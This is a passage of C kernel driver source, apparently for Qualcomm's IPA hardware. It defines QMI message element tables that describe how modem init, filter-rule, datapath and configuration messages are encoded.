			is_ssr_bootup_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x18,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			is_ssr_bootup),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x19,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			hdr_proc_ctx_tbl_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(
			struct ipa_hdr_proc_ctx_tbl_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x19,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			hdr_proc_ctx_tbl_info),
		.ei_array	= ipa_hdr_proc_ctx_tbl_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1A,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			zip_tbl_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_zip_tbl_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1A,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			zip_tbl_info),
		.ei_array	= ipa_zip_tbl_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_init_modem_driver_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_init_modem_driver_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_init_modem_driver_resp_msg_v01,
			ctrl_comm_dest_end_pt_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_init_modem_driver_resp_msg_v01,
			ctrl_comm_dest_end_pt),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_init_modem_driver_resp_msg_v01,
			default_end_pt_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_init_modem_driver_resp_msg_v01,
			default_end_pt),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_indication_reg_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_indication_reg_req_msg_v01,
			master_driver_init_complete_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_indication_reg_req_msg_v01,
			master_driver_init_complete),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_indication_reg_req_msg_v01,
			data_usage_quota_reached_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_indication_reg_req_msg_v01,
			data_usage_quota_reached),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_indication_reg_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_indication_reg_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_master_driver_init_complt_ind_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(struct
			ipa_master_driver_init_complt_ind_msg_v01,
			master_driver_init_status),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_install_fltr_rule_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			filter_spec_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			filter_spec_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_FILTERS_V01,
		.elem_size	= sizeof(struct ipa_filter_spec_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			filter_spec_list),
		.ei_array	= ipa_filter_spec_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			source_pipe_index_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			source_pipe_index),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			num_ipv4_filters_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			num_ipv4_filters),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			num_ipv6_filters_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			num_ipv6_filters),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			xlat_filter_indices_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			xlat_filter_indices_list_len),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= QMI_IPA_MAX_FILTERS_V01,
		.elem_size	= sizeof(uint32_t),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_req_msg_v01,
			xlat_filter_indices_list),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_install_fltr_rule_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_resp_msg_v01,
			resp),
		.ei_array       = get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_resp_msg_v01,
			filter_handle_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_resp_msg_v01,
			filter_handle_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_FILTERS_V01,
		.elem_size	= sizeof(
			struct ipa_filter_rule_identifier_to_handle_map_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_install_fltr_rule_resp_msg_v01,
			filter_handle_list),
		.ei_array	=
			ipa_filter_rule_identifier_to_handle_map_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_fltr_installed_notif_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x01,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			source_pipe_index),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			install_status),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x03,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			filter_index_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_FILTERS_V01,
		.elem_size	= sizeof(
			struct ipa_filter_handle_to_index_map_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x03,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			filter_index_list),
		.ei_array	= ipa_filter_handle_to_index_map_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			embedded_pipe_index_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			embedded_pipe_index),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			retain_header_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			retain_header),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			embedded_call_mux_id_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			embedded_call_mux_id),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			num_ipv4_filters_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			num_ipv4_filters),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			num_ipv6_filters_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			num_ipv6_filters),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			start_ipv4_filter_idx_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			start_ipv4_filter_idx),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			start_ipv6_filter_idx_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_req_msg_v01,
			start_ipv6_filter_idx),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_fltr_installed_notif_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_fltr_installed_notif_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_enable_force_clear_datapath_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x01,
		.offset		= offsetof(
			struct ipa_enable_force_clear_datapath_req_msg_v01,
			source_pipe_bitmask),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_enable_force_clear_datapath_req_msg_v01,
			request_id),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_enable_force_clear_datapath_req_msg_v01,
			throttle_source_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_enable_force_clear_datapath_req_msg_v01,
			throttle_source),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_enable_force_clear_datapath_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_enable_force_clear_datapath_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_disable_force_clear_datapath_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x01,
		.offset		= offsetof(
			struct ipa_disable_force_clear_datapath_req_msg_v01,
			request_id),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_disable_force_clear_datapath_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_disable_force_clear_datapath_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_config_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			peripheral_type_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			peripheral_type),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			hw_deaggr_supported_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			hw_deaggr_supported),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			max_aggr_frame_size_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
					max_aggr_frame_size),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ipa_ingress_pipe_mode_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ipa_ingress_pipe_mode),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			peripheral_speed_info_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			peripheral_speed_info),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_time_limit_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_time_limit),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_pkt_limit_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_pkt_limit),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x17,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_byte_limit_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x17,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_accumulation_byte_limit),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x18,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ul_accumulation_time_limit_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x18,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ul_accumulation_time_limit),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x19,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			hw_control_flags_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x19,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			hw_control_flags),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1A,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ul_msi_event_threshold_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1A,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			ul_msi_event_threshold),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1B,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_msi_event_threshold_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x1B,
		.offset		= offsetof(
			struct ipa_config_req_msg_v01,
			dl_msi_event_threshold),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_config_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_config_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_get_data_stats_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x01,
		.offset		= offsetof(
			struct ipa_get_data_stats_req_msg_v01,
			ipa_stats_type),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_data_stats_req_msg_v01,
			reset_stats_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_data_stats_req_msg_v01,
			reset_stats),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_pipe_stats_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_pipe_stats_info_type_v01,
					pipe_index),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_pipe_stats_info_type_v01,
					num_ipv4_packets),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_pipe_stats_info_type_v01,
					num_ipv4_bytes),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
